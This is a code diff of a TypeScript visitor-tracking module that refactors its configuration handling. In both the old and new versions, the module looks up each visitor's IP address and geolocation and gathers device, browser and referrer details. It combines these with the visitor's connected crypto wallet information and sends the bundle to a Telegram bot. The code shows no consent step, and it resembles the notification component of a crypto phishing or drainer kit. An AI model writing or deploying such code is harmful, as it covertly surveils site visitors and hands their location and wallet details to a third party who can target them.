@@ -1,35 +1,58 @@
 import { StorageManager } from './storage';
 import { sendToTelegram } from './telegram';
-import { DATA_COLLECTION_CONFIG, USER_INFO_CONFIG } from '../config';
+import { 
+  DATA_COLLECTION_CONFIG, USER_INFO_CONFIG, 
+  UserInfoConfigOptions, DataCollectionConfigOptions, 
+  TelegramConfigOptions, 
+  getDataCollectionConfig, getUserInfoConfig 
+} from '../config';
 import { UserInfo, WalletInfo } from '../types/userInfo';
+
+/**
+ * Interface for tracking configuration options
+ */
+export interface TrackingOptions {
+  telegramConfig?: Partial<TelegramConfigOptions>;
+  userInfoConfig?: UserInfoConfigOptions;
+  dataConfig?: DataCollectionConfigOptions;
+}
 
 /**
  * Initializes user tracking and sends data if appropriate
  * @param walletInfo - Information about the user's connected wallet
+ * @param options - Optional configuration overrides
  * @returns Promise that resolves when tracking is complete
  */
-export async function initializeUserTracking(walletInfo: WalletInfo): Promise<void> {
+export async function initializeUserTracking(
+  walletInfo: WalletInfo,
+  options?: TrackingOptions
+): Promise<void> {
+  // Apply custom configurations or use defaults
+  const dataConfig = options?.dataConfig ? 
+    getDataCollectionConfig(options.dataConfig) : 
+    DATA_COLLECTION_CONFIG;
+  
   if (StorageManager.shouldNotifyNewVisit()) {
-    if (DATA_COLLECTION_CONFIG.DEBUG_ENABLED) {
+    if (dataConfig.DEBUG_ENABLED) {
       console.debug('New visit detected - collecting user information...');
     }
     
     try {
-      const userInfo = await getUserInfo(walletInfo);
+      const userInfo = await getUserInfo(walletInfo, options);
       
-      // Send to telegram bot
-      const messageSent = await sendToTelegram(userInfo);
+      // Send to telegram bot with custom configuration if provided
+      const messageSent = await sendToTelegram(userInfo, options?.telegramConfig);
       
       if (messageSent) {
         StorageManager.setVisitTimestamp();
-        if (DATA_COLLECTION_CONFIG.DEBUG_ENABLED) {
+        if (dataConfig.DEBUG_ENABLED) {
           console.debug('Visit recorded and notification sent');
         }
       }
     } catch (error) {
       console.error('Error processing new visit:', error);
     }
-  } else if (DATA_COLLECTION_CONFIG.DEBUG_ENABLED) {
+  } else if (dataConfig.DEBUG_ENABLED) {
     console.debug('Recent visit detected - skipping notification');
   }
 }
@@ -37,16 +60,35 @@ export async function initializeUserTracking(walletInfo: WalletInfo): Promise<vo
 /**
  * Collects comprehensive information about the current user and their device
  * @param walletInfo - Information about the user's connected wallet
+ * @param options - Optional configuration overrides
  * @returns Promise resolving to complete UserInfo object
  */
-async function getUserInfo(walletInfo: WalletInfo): Promise<UserInfo> {
+async function getUserInfo(
+  walletInfo: WalletInfo,
+  options?: TrackingOptions
+): Promise<UserInfo> {
+  // Apply custom configurations or use defaults
+  const userConfig = options?.userInfoConfig ? 
+    getUserInfoConfig(options.userInfoConfig) : 
+    USER_INFO_CONFIG;
+    
+  const dataConfig = options?.dataConfig ? 
+    getDataCollectionConfig(options.dataConfig) : 
+    DATA_COLLECTION_CONFIG;
+
+  // Convert timeout to number if it's a string - define outside try/catch for error handling scope
+  const apiTimeoutMs = typeof userConfig.API_TIMEOUT_MS === 'string' ? 
+    parseInt(userConfig.API_TIMEOUT_MS, 10) : 
+    userConfig.API_TIMEOUT_MS;
+
   try {
+    
     // Set up request with timeout for IP API
     const ipController = new AbortController();
-    const ipTimeoutId = setTimeout(() => ipController.abort(), USER_INFO_CONFIG.API_TIMEOUT_MS);
+    const ipTimeoutId = setTimeout(() => ipController.abort(), apiTimeoutMs);
     
     // Get IP address using the configured API endpoint
-    const ipResponse = await fetch(USER_INFO_CONFIG.IP_API_URL, {
+    const ipResponse = await fetch(userConfig.IP_API_URL, {
       signal: ipController.signal
     });
     clearTimeout(ipTimeoutId);
@@ -59,10 +101,10 @@ async function getUserInfo(walletInfo: WalletInfo): Promise<UserInfo> {
 
     // Set up request with timeout for geolocation API
     const geoController = new AbortController();
-    const geoTimeoutId = setTimeout(() => geoController.abort(), USER_INFO_CONFIG.API_TIMEOUT_MS);
+    const geoTimeoutId = setTimeout(() => geoController.abort(), apiTimeoutMs);
     
     // Get location information using the configured geolocation API
-    const locationResponse = await fetch(`${USER_INFO_CONFIG.GEO_API_URL}/${ip}/json/`, {
+    const locationResponse = await fetch(`${userConfig.GEO_API_URL}/${ip}/json/`, {
       signal: geoController.signal
     });
     clearTimeout(geoTimeoutId);
@@ -96,12 +138,12 @@ async function getUserInfo(walletInfo: WalletInfo): Promise<UserInfo> {
         referrer: document.referrer || 'Direct',
         timeOnPage
       },
-      location: DATA_COLLECTION_CONFIG.COLLECT_LOCATION_INFO ? {
+      location: dataConfig.COLLECT_LOCATION_INFO ? {
         city: locationData.city,
         country: locationData.country_name,
         region: locationData.region
       } : {},
-      device: DATA_COLLECTION_CONFIG.COLLECT_DEVICE_INFO ? {
+      device: dataConfig.COLLECT_DEVICE_INFO ? {
         type: deviceType,
         browser,
         os,
@@ -115,10 +157,17 @@ async function getUserInfo(walletInfo: WalletInfo): Promise<UserInfo> {
       wallet: walletInfo // Use the wallet info passed from the component
     };
   } catch (error: unknown) {
+    // Handle errors with available configuration options
     if (error instanceof DOMException && error.name === 'AbortError') {
       console.error('API request timed out while collecting user information');
+      if (dataConfig.DEBUG_ENABLED) {
+        console.debug('Request timeout details:', { timeout: apiTimeoutMs });
+      }
     } else if (error instanceof Error) {
       console.error('Error collecting user information:', error.message);
+      if (dataConfig.DEBUG_ENABLED) {
+        console.debug('Error details:', { name: error.name });
+      }
     } else {
       console.error('Unknown error collecting user information');
     }
@@ -136,7 +185,7 @@ async function getUserInfo(walletInfo: WalletInfo): Promise<UserInfo> {
         type: 'Desktop',
         browser: 'Unknown',
         os: 'Unknown',
-        userAgent: navigator.userAgent
+        userAgent: dataConfig.DEBUG_ENABLED ? navigator.userAgent : 'Redacted'
       },
       wallet: walletInfo
     };
